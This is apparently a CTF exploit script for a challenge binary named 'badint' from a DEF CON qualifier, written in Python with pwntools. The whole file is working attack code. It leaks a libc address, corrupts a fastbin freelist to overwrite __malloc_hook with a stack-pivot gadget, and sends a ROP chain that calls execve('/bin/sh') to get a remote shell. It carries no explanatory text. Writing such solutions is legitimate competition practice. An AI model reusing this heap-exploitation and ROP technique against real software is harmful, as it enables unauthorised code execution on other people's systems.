#!/usr/bin/python
from pwn import *

HOST = "badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me"
PORT = 21813

def sendSeq(seq, offset, data, lsf, rec=True):
	r.sendlineafter(":", str(seq))
	r.sendlineafter("Offset:", str(offset))
	r.sendlineafter("Data:", data)
	
	if (rec):
		r.recvuntil(":")
		if lsf:
			r.sendline("Yes")
		else:
			r.sendline("No")

def addr(a):
	return p64(a).encode("hex")

def exploit():		
	log.info("Leak LIBC base")

	sendSeq(0, 8, ('B'*0x80).encode("hex"), True)	
	
	data = r.recvuntil("0000").split(":")[2].strip()
	
	LEAK = u64(data.decode("hex"))	
	LIBC = LEAK - 0x3be7b8

	# Calculate gadgets
	MALLOC_HOOK = LEAK - 0x8b	
	ADDESP  	= LIBC + 0x000000000002c1e7			# Add RSP, 0xa8
	POPRAX  	= LIBC + 0x000000000001b218
	POPRSI  	= LIBC + 0x0000000000024805
	POPRDI  	= LIBC + 0x0000000000022b1a
	POPRDX  	= LIBC + 0x0000000000001b8e
	BINSH   	= LIBC + 0x000000000017ccdb
	SYSCALL 	= LIBC + 0x00000000000c1e55
	RET     	= LIBC + 0x0000000000088c85

	log.success("LIBC leak       : %s" % hex(LEAK))
	log.success("LIBC base       : %s" % hex(LIBC))
	log.success("MALLOC_HOOK     : %s" % hex(MALLOC_HOOK))
	log.success("ADDESP          : %s" % hex(ADDESP))

	log.info("Prepare fastbin list")
	
	log.info("Create fastbin chunks and free them to populate fastbin list")
		
	sendSeq(0, 0, "A"*0x16*2, True)		
	sendSeq(0, 0, "B"*0x60*2, True)
		
	log.info("Overwrite Fastbin FD and get pointer to MALLOC_HOOK into fastbin list")
		
	sendSeq(0, 0x150, addr(MALLOC_HOOK), True)
	
	log.info("Allocate chunk to overwrite MALLOC_HOOK")
	
	# Pivot stack to the rop chain
	payload = "\x01"*(0x6)
	payload += addr(ADDESP)		
	payload += "\x01"*(0x60*2-len(payload))

	sendSeq(0, 0, payload, False)

	log.info("Send ROP chain")
	
	payload = p64(0)*6				# Padding
		
	# read(0, 0x604900, 24)
	payload += p64(POPRAX)
	payload += p64(0x0)
	payload += p64(POPRDI)
	payload += p64(0x0)
	payload += p64(POPRSI)
	payload += p64(0x604900)
	payload += p64(POPRDX)
	payload += p64(24)
	payload += p64(SYSCALL)

	# execve("/bin/sh", ["sh"], 0)
	payload += p64(POPRAX)
	payload += p64(59)
	payload += p64(POPRDI)
	payload += p64(BINSH)
	payload += p64(POPRSI)
	payload += p64(0x604900)
	payload += p64(POPRDX)
	payload += p64(0x0)
	payload += p64(SYSCALL)
		
	# Padding payload up, so correct fast bin chunk will be used
	payload += "\x02"*(0x60*2-len(payload))

	sendSeq(0, 0, payload, False, False)

	log.info("Send SH array")		

	payload = p64(0x604910)						# Pointer to SH
	payload += p64(0x0)
	payload += "sh\x00\x00\x00\x00\x00\x00"		# SH

	r.sendline(payload)

	r.interactive()

	return

if __name__ == "__main__":	
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit()
	else:
		r = process("./badint", env={"LD_PRELOAD" : "./libc.so"})

		print util.proc.pidof(r)
		pause()
		exploit()
    
